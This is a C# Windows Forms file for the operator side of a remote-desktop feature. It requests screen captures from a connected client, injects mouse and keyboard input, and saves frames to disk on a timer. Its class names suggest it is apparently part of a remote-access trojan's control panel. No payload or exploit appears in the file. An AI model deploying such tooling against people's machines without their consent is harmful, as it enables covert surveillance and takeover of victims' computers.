using StreamLibrary;
using StreamLibrary.UnsafeCodecs;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Server.Connection;
using Server.MessagePack;
using System.Threading;
using System.Drawing.Imaging;
using System.IO;
using Encoder = System.Drawing.Imaging.Encoder;

namespace Server.Forms
{
    public partial class FormRemoteDesktop : Form
    {
        public Form1 F { get; set; }
        internal Clients ParentClient { get; set; }
        internal Clients Client { get; set; }
        public string FullPath { get; set; }

        public int FPS = 0;
        public Stopwatch sw = Stopwatch.StartNew();
        public IUnsafeCodec decoder = new UnsafeStreamCodec(60);
        public Size rdSize;
        private bool isMouse = false;
        private bool isKeyboard = false;
        public object syncPicbox = new object();
        private readonly List<Keys> _keysPressed;
        public Image GetImage { get; set; }
        public FormRemoteDesktop()
        {
            _keysPressed = new List<Keys>();
            InitializeComponent();
        }


        private void timer1_Tick(object sender, EventArgs e)
        {
            try
            {
                if (!ParentClient.TcpClient.Connected || !Client.TcpClient.Connected) this.Close();
            }
            catch { this.Close(); }
        }

        private void Button2_Click(object sender, EventArgs e)
        {
            if (panel1.Visible == false)
            {
                panel1.Visible = true;
                button2.Top = panel1.Bottom + 5;
                button2.BackgroundImage = Properties.Resources.arrow_up;
            }
            else
            {
                panel1.Visible = false;
                button2.Top = pictureBox1.Top + 5;
                button2.BackgroundImage = Properties.Resources.arrow_down;
            }
        }

        private void FormRemoteDesktop_Load(object sender, EventArgs e)
        {
            try
            {
                button2.Top = panel1.Bottom + 5;
                button2.Left = pictureBox1.Width / 2;
                button1.Tag = (object)"stop";
                button2.PerformClick();
            }
            catch { }
        }

        private void Button1_Click(object sender, EventArgs e)
        {
            if (button1.Tag == (object)"play")
            {
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "remoteDesktop";
                msgpack.ForcePathObject("Option").AsString = "capture";
                msgpack.ForcePathObject("Quality").AsInteger = Convert.ToInt32(numericUpDown1.Value.ToString());
                msgpack.ForcePathObject("Screen").AsInteger = Convert.ToInt32(numericUpDown2.Value.ToString());
                decoder = new UnsafeStreamCodec(Convert.ToInt32(numericUpDown1.Value));
                ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                numericUpDown1.Enabled = false;
                numericUpDown2.Enabled = false;
                btnSave.Enabled = true;
                btnMouse.Enabled = true;
                button1.Tag = (object)"stop";
                button1.BackgroundImage = Properties.Resources.stop__1_;
            }
            else
            {
                button1.Tag = (object)"play";
                try
                {
                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "remoteDesktop";
                    msgpack.ForcePathObject("Option").AsString = "stop";
                    ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                }
                catch { }
                numericUpDown1.Enabled = true;
                numericUpDown2.Enabled = true;
                btnSave.Enabled = false;
                btnMouse.Enabled = false;
                button1.BackgroundImage = Properties.Resources.play_button;
            }
        }

        private void FormRemoteDesktop_ResizeEnd(object sender, EventArgs e)
        {
            button2.Left = pictureBox1.Width / 2;
        }

        private void BtnSave_Click(object sender, EventArgs e)
        {
            if (button1.Tag == (object)"stop")
            {
                if (timerSave.Enabled)
                {
                    timerSave.Stop();
                    btnSave.BackgroundImage = Properties.Resources.save_image;
                }
                else
                {
                    timerSave.Start();
                    btnSave.BackgroundImage = Properties.Resources.save_image2;
                    try
                    {
                        if (!Directory.Exists(FullPath))
                            Directory.CreateDirectory(FullPath);
                        Process.Start(FullPath);
                    }
                    catch { }
                }
            }
        }

        private void TimerSave_Tick(object sender, EventArgs e)
        {
            try
            {
                if (!Directory.Exists(FullPath))
                    Directory.CreateDirectory(FullPath);
                Encoder myEncoder = Encoder.Quality;
                EncoderParameters myEncoderParameters = new EncoderParameters(1);
                EncoderParameter myEncoderParameter = new EncoderParameter(myEncoder, 50L);
                myEncoderParameters.Param[0] = myEncoderParameter;
                ImageCodecInfo jpgEncoder = GetEncoder(ImageFormat.Jpeg);
                pictureBox1.Image.Save(FullPath + $"\\IMG_{DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss")}.jpeg", jpgEncoder, myEncoderParameters);
                myEncoderParameters?.Dispose();
                myEncoderParameter?.Dispose();
            }
            catch { }
        }

        private ImageCodecInfo GetEncoder(ImageFormat format)
        {
            ImageCodecInfo[] codecs = ImageCodecInfo.GetImageDecoders();
            foreach (ImageCodecInfo codec in codecs)
            {
                if (codec.FormatID == format.Guid)
                {
                    return codec;
                }
            }
            return null;
        }

        private void PictureBox1_MouseDown(object sender, MouseEventArgs e)
        {
            try
            {
                if (button1.Tag == (object)"stop" && pictureBox1.Image != null && pictureBox1.ContainsFocus && isMouse)
                {
                    Point p = new Point(e.X * rdSize.Width / pictureBox1.Width, e.Y * rdSize.Height / pictureBox1.Height);
                    int button = 0;
                    if (e.Button == MouseButtons.Left)
                        button = 2;
                    if (e.Button == MouseButtons.Right)
                        button = 8;

                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "remoteDesktop";
                    msgpack.ForcePathObject("Option").AsString = "mouseClick";
                    msgpack.ForcePathObject("X").AsInteger = p.X;
                    msgpack.ForcePathObject("Y").AsInteger = p.Y;
                    msgpack.ForcePathObject("Button").AsInteger = button;
                    ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                }
            }
            catch { }
        }

        private void PictureBox1_MouseUp(object sender, MouseEventArgs e)
        {
            try
            {
                if (button1.Tag == (object)"stop" && pictureBox1.Image != null && pictureBox1.ContainsFocus && isMouse)
                {
                    Point p = new Point(e.X * rdSize.Width / pictureBox1.Width, e.Y * rdSize.Height / pictureBox1.Height);
                    int button = 0;
                    if (e.Button == MouseButtons.Left)
                        button = 4;
                    if (e.Button == MouseButtons.Right)
                        button = 16;

                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "remoteDesktop";
                    msgpack.ForcePathObject("Option").AsString = "mouseClick";
                    msgpack.ForcePathObject("X").AsInteger = p.X;
                    msgpack.ForcePathObject("Y").AsInteger = p.Y;
                    msgpack.ForcePathObject("Button").AsInteger = button;
                    ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                }
            }
            catch { }
        }

        private void pictureBox1_MouseMove(object sender, MouseEventArgs e)
        {
            try
            {
                if (pictureBox1.Image != null && this.ContainsFocus && isMouse)
                {
                    Point p = new Point(e.X * (rdSize.Width / pictureBox1.Width), e.Y * (rdSize.Height / pictureBox1.Height));
                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "remoteDesktop";
                    msgpack.ForcePathObject("Option").AsString = "mouseMove";
                    msgpack.ForcePathObject("X").AsInteger = p.X;
                    msgpack.ForcePathObject("Y").AsInteger = p.Y;
                    ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                }
            }
            catch { }
        }

        private void Button3_Click(object sender, EventArgs e)
        {
            if (isMouse)
            {
                isMouse = false;
                btnMouse.BackgroundImage = Properties.Resources.mouse;
            }
            else
            {
                isMouse = true;
                btnMouse.BackgroundImage = Properties.Resources.mouse_enable;
            }
            pictureBox1.Focus();
        }

        private void FormRemoteDesktop_FormClosed(object sender, FormClosedEventArgs e)
        {
            try
            {
                GetImage?.Dispose();
                ThreadPool.QueueUserWorkItem((o) =>
                {
                    Client?.Disconnected();
                });
            }
            catch { }
        }

        private void btnKeyboard_Click(object sender, EventArgs e)
        {
            if (isKeyboard)
            {
                isKeyboard = false;
                btnKeyboard.BackgroundImage = Properties.Resources.keyboard;
            }
            else
            {
                isKeyboard = true;
                btnKeyboard.BackgroundImage = Properties.Resources.keyboard_on;
            }
            pictureBox1.Focus();
        }

        private void FormRemoteDesktop_KeyDown(object sender, KeyEventArgs e)
        {
            if (button1.Tag == (object)"stop" && pictureBox1.Image != null && pictureBox1.ContainsFocus && isKeyboard)
            {
                if (!IsLockKey(e.KeyCode))
                    e.Handled = true;

                if (_keysPressed.Contains(e.KeyCode))
                    return;

                _keysPressed.Add(e.KeyCode);

                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "remoteDesktop";
                msgpack.ForcePathObject("Option").AsString = "keyboardClick";
                msgpack.ForcePathObject("key").AsInteger = Convert.ToInt32(e.KeyCode);
                msgpack.ForcePathObject("keyIsDown").SetAsBoolean(true);
                ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
            }
        }

        private void FormRemoteDesktop_KeyUp(object sender, KeyEventArgs e)
        {
            if (button1.Tag == (object)"stop" && pictureBox1.Image != null && this.ContainsFocus && isKeyboard)
            {
                if (!IsLockKey(e.KeyCode))
                    e.Handled = true;

                _keysPressed.Remove(e.KeyCode);

                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "remoteDesktop";
                msgpack.ForcePathObject("Option").AsString = "keyboardClick";
                msgpack.ForcePathObject("key").AsInteger = Convert.ToInt32(e.KeyCode);
                msgpack.ForcePathObject("keyIsDown").SetAsBoolean(false);
                ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
            }
        }

        private bool IsLockKey(Keys key)
        {
            return ((key & Keys.CapsLock) == Keys.CapsLock)
                   || ((key & Keys.NumLock) == Keys.NumLock)
                   || ((key & Keys.Scroll) == Keys.Scroll);
        }


    }
}
